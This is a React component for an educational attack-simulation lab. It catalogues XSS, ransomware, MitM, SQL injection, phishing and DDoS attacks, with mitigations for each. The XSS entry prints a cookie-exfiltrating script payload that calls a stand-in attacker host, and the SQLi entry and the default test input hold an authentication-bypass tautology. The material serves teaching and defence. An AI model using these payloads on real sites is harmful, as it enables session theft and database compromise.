import React, { useState } from 'react';
import {
  Code,
  Lock,
  Share2,
  Database,
  Mail,
  Flame,
  Shield,
  ShieldCheck,
  ShieldAlert,
  ShieldX,
  Play,
  Pause,
  RotateCcw,
  Sparkles,
  Info,
  CheckCircle,
  AlertTriangle,
  Layers,
  Crosshair,
  ChevronRight,
  Terminal,
  Activity
} from 'lucide-react';

import { SIMULATION_ATTACKS } from './attack-sim/attackSimData';
import { usePacketSimulation } from './attack-sim/usePacketSimulation';
import NetworkDiagram from './attack-sim/NetworkDiagram';
import SimulationControls from './attack-sim/SimulationControls';
import DeviceDetailPanel from './attack-sim/DeviceDetailPanel';
import LiveMetricsBar from './attack-sim/LiveMetricsBar';
import LiveEventLog from './attack-sim/LiveEventLog';
import { SectionWhatIsThisAttack, SectionWhatDidWeLearn } from './attack-sim/EducationalSections';

/* ── Backwards-compatible ATTACK_CATALOG export ── */
export const ATTACK_CATALOG = [
  {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS Execution)',
    shortName: 'XSS Scripting',
    severity: 'HIGH',
    icon: Code,
    color: 'sky',
    summary: 'Hostile JavaScript payload injected into application fields executes arbitrarily inside other victims\' browsers.',
    howItWorks: [
      'Attacker submits stored payload `<script>fetch("https://attacker.c2/steal?cookie="+document.cookie)</script>`.',
      'Server stores payload in database without HTML entity encoding.',
      'When legitimate users view the page, their browser interprets and executes the malicious script.',
      'Victim session cookies and auth tokens are exfiltrated to attacker server.'
    ],
    realWorldImpact: 'Client-side account takeover, malicious DOM manipulation, keylogging, and portal defacement.',
    mitigation: 'AdaptiveShield payload heuristic filters, Context-aware HTML entity encoding, Content Security Policy (CSP), and `HttpOnly` cookie flags.',
    cveExample: 'CWE-79: Improper Neutralization of Input During Web Page Generation'
  },
  {
    id: 'ransomware',
    title: 'Ransomware Network Propagation',
    shortName: 'Ransomware Worm',
    severity: 'CRITICAL',
    icon: Lock,
    color: 'rose',
    summary: 'Self-replicating malware breaches one endpoint and traverses SMB/RDP shares to encrypt all connected file clusters.',
    howItWorks: [
      'Initial loader executes on single workstation via malicious attachment or unpatched RDP port.',
      'Malware probes internal subnet for lateral ports (Port 445 SMB, Port 3389 RDP).',
      'Uses AES-256 / RSA-4096 asymmetric cryptography to lock all local and network files with `.locked` extension.',
      'Drops extortion note demanding crypto ransom for the decryption private key.'
    ],
    realWorldImpact: 'Total infrastructure freeze, irreversible data destruction, massive extortion payouts (e.g., WannaCry, NotPetya).',
    mitigation: 'AdaptiveShield Stage 2 port filtering (blocking Port 445 & 3389), network micro-segmentation, immutable air-gapped backups, and automated zero-trust host isolation.',
    cveExample: 'CVE-2017-0144 (EternalBlue SMB Remote Code Execution)'
  },
  {
    id: 'mitm',
    title: 'Man-in-the-Middle (MitM) Eavesdropping',
    shortName: 'MitM Proxy',
    severity: 'HIGH',
    icon: Share2,
    color: 'blue',
    summary: 'Attacker positions an interception proxy between client and server, eavesdropping or modifying plaintext traffic.',
    howItWorks: [
      'Attacker executes ARP spoofing, rogue Wi-Fi AP broadcast, or DNS cache poisoning on local LAN.',
      'Victim packet stream is routed through attacker machine before reaching real gateway.',
      'Attacker strips TLS (SSL stripping) or presents forged root certificate.',
      'Sensitive tokens, cookies, and API payloads are read, forged, or altered in flight.'
    ],
    realWorldImpact: 'Session hijacking, financial transaction tampering, corporate espionage on unencrypted LANs.',
    mitigation: 'HSTS (HTTP Strict Transport Security), TLS 1.3 encryption, Certificate Pinning, and IEEE 802.1X port authentication.',
    cveExample: 'CWE-300: Channel Accessible by Non-Endpoint'
  },
  {
    id: 'sqli',
    title: 'SQL Injection (SQLi) Vulnerability',
    shortName: 'SQL Injection',
    severity: 'CRITICAL',
    icon: Database,
    color: 'purple',
    summary: 'Malicious SQL fragment injected into web form inputs bypasses auth checks and dumps entire relational databases.',
    howItWorks: [
      "User submits input payload containing boolean tautologies like `admin' OR '1'='1' --`.",
      'Vulnerable backend concatenates unsanitized input directly into raw SQL string.',
      'SQL engine evaluates `WHERE username = \'\' OR \'1\'=\'1\'` to TRUE for all rows.',
      'Database authenticates attacker without valid password and permits full data exfiltration.'
    ],
    realWorldImpact: 'Complete database compromise, mass customer data leaks, unauthorized record manipulation.',
    mitigation: 'AdaptiveShield Stage 4 Deep Payload DPI regex filter, Parameterized Queries / Prepared Statements, ORM frameworks, and strict WAF input sanitization.',
    cveExample: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command'
  },
  {
    id: 'phishing',
    title: 'Phishing & Social Engineering Attack',
    shortName: 'Phishing Probe',
    severity: 'HIGH',
    icon: Mail,
    color: 'amber',
    summary: 'Deceptive login interface tricks victim into entering credentials, routing them straight to an adversary C2 node.',
    howItWorks: [
      'Attacker sends a spoofed urgency email with a link to a cloned corporate login portal.',
      'Victim submits username, password, and session token into the deceptive form.',
      'Malicious proxy intercepts payload, stores plain credentials, and forwards victim to real service.',
      'Attacker uses harvested credentials to establish persistent unauthorized lateral access.'
    ],
    realWorldImpact: 'Enterprise credential compromise, account takeovers, MFA bypass via Adversary-in-the-Middle (AiTM).',
    mitigation: 'FIDO2 WebAuthn hardware security keys, DMARC/DKIM email enforcement, domain reputation filtering, and zero-trust conditional access.',
    cveExample: 'CWE-200: Exposure of Sensitive Information'
  },
  {
    id: 'ddos',
    title: 'DDoS Attack (Distributed Denial of Service)',
    shortName: 'DDoS Flood',
    severity: 'CRITICAL',
    icon: Flame,
    color: 'rose',
    summary: 'Botnet army coordinates a massive volumetric packet surge to exhaust target bandwidth and CPU resources.',
    howItWorks: [
      'Attacker commands a Command & Control (C2) botnet of compromised IoT devices or servers.',
      'Millions of spoofed SYN, UDP, or HTTP requests are simultaneously blasted at target IP/port.',
      'Target network buffer and server worker pools saturate to 100% capacity.',
      'Legitimate user requests timeout or receive HTTP 503/504 errors as the server crashes.'
    ],
    realWorldImpact: 'Service downtime, millions in revenue loss, SLA breaches (e.g., Mirai Botnet, Dyn DNS outage).',
    mitigation: 'AdaptiveShield sliding-window rate limiting, SYN cookies, Anycast BGP scrubbers, and volumetric IP blacklisting.',
    cveExample: 'CWE-400: Uncontrolled Resource Consumption'
  }
];

export default function AttackVisualizerLab({ processIncomingPacket }) {
  const [selectedAttackId, setSelectedAttackId] = useState('ddos');
  const [selectedElement, setSelectedElement] = useState(null);

  // Live C++ Engine testing state (optional interactive payload evaluator)
  const [testPayload, setTestPayload] = useState("' OR '1'='1");
  const [liveDecision, setLiveDecision] = useState(null);

  const activeAttack = SIMULATION_ATTACKS[selectedAttackId] || SIMULATION_ATTACKS.ddos;

  // Master Packet Simulation Engine Hook
  const {
    isPlaying,
    setIsPlaying,
    defenseActive,
    setDefenseActive,
    speed,
    setSpeed,
    currentStepIndex,
    setCurrentStepIndex,
    activePackets,
    quarantinedPackets,
    metrics,
    eventLogs,
    currentExplanation,
    activeNodeId,
    activeConnectionId,
    resetSimulation,
    stepForward
  } = usePacketSimulation({
    attackId: selectedAttackId,
    nodes: activeAttack.nodes,
    connections: activeAttack.connections
  });

  const handleSelectAttack = (attackId) => {
    setSelectedAttackId(attackId);
    setSelectedElement(null);
  };

  // Live C++ Engine Test Handler
  const handleRunLiveEngineTest = (customString) => {
    if (!processIncomingPacket) return;
    const sample = {
      id: `SIM-${Math.floor(1000 + Math.random() * 9000)}`,
      timestamp: new Date().toISOString(),
      srcIp: '192.168.1.188',
      dstPort: 443,
      protocol: 'HTTPS',
      payload: customString || testPayload,
      length: 256,
      method: 'POST',
      path: '/api/v1/auth',
      geo: 'US'
    };
    const dec = processIncomingPacket(sample);
    setLiveDecision(dec);
  };

  return (
    <div className="space-y-8 animate-fadeIn text-slate-100 w-full">

      {/* ── Section Header ── */}
      <div className="text-center max-w-3xl mx-auto space-y-2.5 px-2">
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-blue-600/10 border border-blue-500/30 text-blue-400 text-xs font-mono font-semibold tracking-wider">
          <Crosshair className="w-3.5 h-3.5 text-blue-400" />
          ANIMATED PACKET SIMULATOR · INTERACTIVE THREAT LAB
        </div>
        <h2 className="text-2xl sm:text-3xl lg:text-4xl font-extrabold tracking-tight text-white">
          Visual Attack Simulations <span className="bg-gradient-to-r from-blue-400 via-sky-300 to-indigo-400 bg-clip-text text-transparent">&amp; Defense Engine</span>
        </h2>
        <p className="text-xs sm:text-sm lg:text-base text-slate-300">
          Watch live animated packets move between network components, observe real-time defense interception at firewalls, and inspect attack consequences when defense is disabled.
        </p>
      </div>

      {/* ── Attack Scenario Selector (Responsive 6-Card Grid) ── */}
      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2.5 sm:gap-3">
        {Object.values(SIMULATION_ATTACKS).map((atk, index) => {
          const Icon = atk.icon;
          const isSelected = selectedAttackId === atk.id;
          return (
            <button
              key={atk.id}
              onClick={() => handleSelectAttack(atk.id)}
              className={`p-3 sm:p-4 rounded-2xl text-left flex flex-col justify-between space-y-2 sm:space-y-3 transition-all duration-200 cursor-pointer min-h-[100px] sm:min-h-[116px] ${
                isSelected
                  ? 'bg-white text-slate-900 shadow-xl shadow-blue-500/20 ring-2 ring-blue-500 scale-[1.02]'
                  : 'bg-slate-900/90 hover:bg-slate-800 text-slate-300 border border-slate-800'
              }`}
            >
              <div className="flex items-center justify-between w-full">
                <div className={`w-8 h-8 sm:w-9 sm:h-9 rounded-xl flex items-center justify-center ${
                  isSelected ? 'bg-blue-600 text-white shadow-md' : 'bg-slate-800 text-slate-400'
                }`}>
                  <Icon className="w-4 h-4 sm:w-5 sm:h-5" />
                </div>
                <span className={`text-[8px] sm:text-[9px] font-mono font-bold px-1.5 py-0.5 rounded border ${
                  atk.severity === 'CRITICAL'
                    ? (isSelected ? 'bg-rose-100 text-rose-700 border-rose-300' : 'bg-rose-500/10 text-rose-400 border-rose-500/30')
                    : (isSelected ? 'bg-amber-100 text-amber-700 border-amber-300' : 'bg-amber-500/10 text-amber-400 border-amber-500/30')
                }`}>
                  SIM {index + 1}
                </span>
              </div>

              <div>
                <h3 className={`text-xs sm:text-sm font-bold truncate ${isSelected ? 'text-slate-900' : 'text-slate-200'}`}>
                  {atk.shortName}
                </h3>
                <p className={`text-[9px] sm:text-[10px] mt-0.5 truncate ${isSelected ? 'text-slate-500' : 'text-slate-400'}`}>
                  {atk.category}
                </p>
              </div>
            </button>
          );
        })}
      </div>

      {/* ── Main Simulation Container (Clean, Crisp Light Theme Workspace) ── */}
      <div className="rounded-3xl bg-slate-100/90 border border-slate-300/80 p-3 sm:p-6 lg:p-8 space-y-6 shadow-2xl text-slate-900">

        {/* ── Section A: What is this attack? ── */}
        <SectionWhatIsThisAttack attack={activeAttack} />

        {/* ── Live Metrics Bar (Packets Generated, Inspected, Blocked, Delivered, Status, Health) ── */}
        <LiveMetricsBar
          metrics={metrics}
          defenseActive={defenseActive}
        />

        {/* ── Section B: Fully Animated 2D Network Diagram with Moving Packets ── */}
        <div className="space-y-3">
          <div className="flex items-center justify-between px-1">
            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-blue-600" />
              <h3 className="text-sm sm:text-base font-bold text-slate-900 font-mono uppercase tracking-wide">
                Section B · Animated Network Diagram
              </h3>
            </div>
            <span className="text-xs text-slate-500 font-mono hidden sm:inline-block">
              Precise SVG Packet Transit · Visual Interception &amp; Quarantine
            </span>
          </div>

          <NetworkDiagram
            attack={activeAttack}
            currentStepIndex={currentStepIndex}
            defenseActive={defenseActive}
            isPlaying={isPlaying}
            selectedElement={selectedElement}
            onSelectElement={setSelectedElement}
            activePackets={activePackets}
            quarantinedPackets={quarantinedPackets}
            metrics={metrics}
            activeNodeId={activeNodeId}
            activeConnectionId={activeConnectionId}
          />
        </div>

        {/* Selected Device or Connection Inspector Panel */}
        {selectedElement && (
          <DeviceDetailPanel
            selectedElement={selectedElement}
            onClose={() => setSelectedElement(null)}
            defenseActive={defenseActive}
          />
        )}

        {/* ── Section C: Playback Controls & Timeline ── */}
        <div className="space-y-3">
          <div className="flex items-center justify-between px-1">
            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-blue-600" />
              <h3 className="text-sm sm:text-base font-bold text-slate-900 font-mono uppercase tracking-wide">
                Section C · Playback Controls &amp; Step Pacing
              </h3>
            </div>
            <span className="text-xs text-slate-500 font-mono hidden sm:inline-block">
              Speed: {speed}× · {isPlaying ? 'Playing' : 'Paused'}
            </span>
          </div>

          <SimulationControls
            attack={activeAttack}
            currentStepIndex={currentStepIndex}
            onStepChange={setCurrentStepIndex}
            isPlaying={isPlaying}
            onTogglePlay={() => setIsPlaying(!isPlaying)}
            onReset={resetSimulation}
            defenseActive={defenseActive}
            onToggleDefense={() => setDefenseActive(!defenseActive)}
            speed={speed}
            onSpeedChange={setSpeed}
            onStepForward={stepForward}
          />
        </div>

        {/* ── Live Event Log Timeline ── */}
        <LiveEventLog
          eventLogs={eventLogs}
          currentExplanation={currentExplanation}
          defenseActive={defenseActive}
        />

        {/* ── Section D: What did we learn? ── */}
        <SectionWhatDidWeLearn
          attack={activeAttack}
          defenseActive={defenseActive}
        />

        {/* ── Optional Live C++ WebAssembly Engine Verification Bar ── */}
        {processIncomingPacket && (
          <div className="rounded-2xl bg-slate-900 border border-slate-800 p-4 sm:p-5 text-slate-200 space-y-3">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4 text-emerald-400" />
                <span className="text-xs font-mono font-bold text-white uppercase tracking-wider">
                  Test Live Payload Against AdaptiveShield C++ Engine (WASM)
                </span>
              </div>
              <span className="text-[10px] font-mono text-emerald-400 font-semibold bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/30">
                Stage 4 DPI Regex Active
              </span>
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <input
                type="text"
                value={testPayload}
                onChange={(e) => setTestPayload(e.target.value)}
                placeholder="Enter test payload, e.g. <script>alert(1)</script> or ' OR '1'='1"
                className="flex-1 min-w-[240px] bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 text-xs font-mono text-white placeholder-slate-500 focus:outline-none focus:border-blue-500"
              />
              <button
                onClick={() => handleRunLiveEngineTest()}
                className="px-4 py-2 rounded-xl bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold transition-all cursor-pointer shadow-md shadow-blue-600/20"
              >
                Inspect With C++ Engine
              </button>
            </div>

            {liveDecision && (
              <div className="p-3 rounded-xl bg-slate-950/80 border border-slate-800 text-xs font-mono flex flex-wrap items-center justify-between gap-2 animate-fadeIn">
                <div className="flex items-center gap-2">
                  <span className="text-slate-400">Verdict:</span>
                  <span className={`px-2 py-0.5 rounded font-bold ${
                    liveDecision.allowed ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'
                  }`}>
                    {liveDecision.action} ({liveDecision.allowed ? 'PASSED' : 'BLOCKED'})
                  </span>
                  <span className="text-slate-400">Risk Score: {liveDecision.finalRiskScore}/100</span>
                </div>
                <div className="text-slate-400 truncate max-w-[320px]">
                  {liveDecision.verdictReason}
                </div>
              </div>
            )}
          </div>
        )}

      </div>
    </div>
  );
}
